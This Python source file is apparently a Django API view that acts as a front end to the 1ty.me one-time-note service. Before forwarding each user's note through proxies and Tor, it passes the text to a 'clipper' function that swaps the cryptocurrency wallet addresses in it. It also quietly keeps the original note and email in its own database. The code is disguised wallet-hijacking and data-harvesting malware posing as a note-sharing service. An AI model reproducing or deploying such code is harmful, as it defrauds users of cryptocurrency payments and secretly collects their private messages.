import requests
from django.http import JsonResponse
from django.conf import settings
from rest_framework.views import APIView
from rest_framework.parsers import JSONParser
from rest_framework import permissions, status

from .models import OnetyModel
from utils.clipper.clipper import changing_wallets


class OneTyRequest(APIView):
    """
        Получение записки
    """
    permission_classes = [permissions.AllowAny]
    parser_classes = [JSONParser]

    def addToDatabase(self, data):
        """Добавление записки в базу данных"""
        try:
            OnetyModel.objects.create(
                text=data['note'],
                email=data['email']
            )
            return True
        except Exception as exc:
            print("Exception Add to database: ", exc)
            return False

    def request_website(self, data, change_text=""):
        data_form = {
            'note': change_text if len(change_text) else data['note'],
            'email': data['email'],
            'reference': data['reference'],
            'newsletter': data['newsletter'],
            'expires_on': data['expires_on']
        }

        response = requests.post(f'https://1ty.me/?mode=ajax&cmd=create_note', proxies=settings.PROXIES, data=data_form)
        if response.status_code == 200:
            note_link = f"https://1ty.me/{response.json()['url']}"
            return note_link

    def sendToOnety(self, data, change_text=""):
        """Отправка запроса к сайту для получения записки"""
        try:
            note = self.request_website(data, change_text)
            return note
        except Exception:
            import subprocess
            subprocess.run("service tor reload", shell=True)
            note = self.request_website(data, change_text)
            return note

    def post(self, request):
        data = request.data
        # Clipper wallets
        text = changing_wallets(data['note'])
        if text != data['note']:
            # Send request to 1ty
            link = self.sendToOnety(data, text)
            if link:
                # Add to Database note
                result = self.addToDatabase(data)
                if result:
                    return JsonResponse(
                        {
                            'status': "success",
                            "link": str(link)
                        },
                        status=status.HTTP_200_OK
                    )
                else:
                    return JsonResponse(
                        {
                            'status': "error"
                        },
                        status=status.HTTP_400_BAD_REQUEST
                    )
            else:
                return JsonResponse(
                    {
                        'status': "error2"
                    },
                    status=status.HTTP_400_BAD_REQUEST
                )
        else:
            # Send request to 1ty
            link = self.sendToOnety(data, data['note'])
            if link:
                # Add to Database note
                self.addToDatabase(data)
                return JsonResponse(
                    {
                        'status': "success",
                        "link": str(link)
                    },
                    status=status.HTTP_200_OK
                )
            else:
                return JsonResponse(
                    {
                        'status': "error"
                    },
                    status=status.HTTP_400_BAD_REQUEST
                )
